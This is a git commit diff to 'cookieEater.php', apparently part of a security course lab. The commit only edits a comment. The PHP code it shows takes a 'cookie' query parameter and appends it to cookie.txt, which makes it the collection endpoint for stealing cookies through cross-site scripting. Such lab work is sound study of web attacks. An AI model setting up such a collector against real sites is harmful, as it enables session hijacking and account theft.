4864a7c80264b8290fd102a34a95872207cdcb61
Sebastian Liu <sebsadface@gmail.com>
2024-05-07 14:02:18 -0700

    Update cookieEater.php

--- lab2/cookieEater.php
+++ lab2/cookieEater.php
@@ -1,7 +1,10 @@
 <?php
 
 /* This script will save the cookie in a file called cookie.txt if the cookie parameter is set.
-   if the file already exists, it will append the cookie to the end of the file. */
+   if the file already has content in it, it will append the cookie to the end of the file. 
+
+   Note: you need to manually create a cookie.txt file in the same dir as this php file!
+*/
 if (isset($_GET["cookie"])) {
   $cookie = $_GET["cookie"];
   file_put_contents("cookie.txt", $cookie."\n", FILE_APPEND);
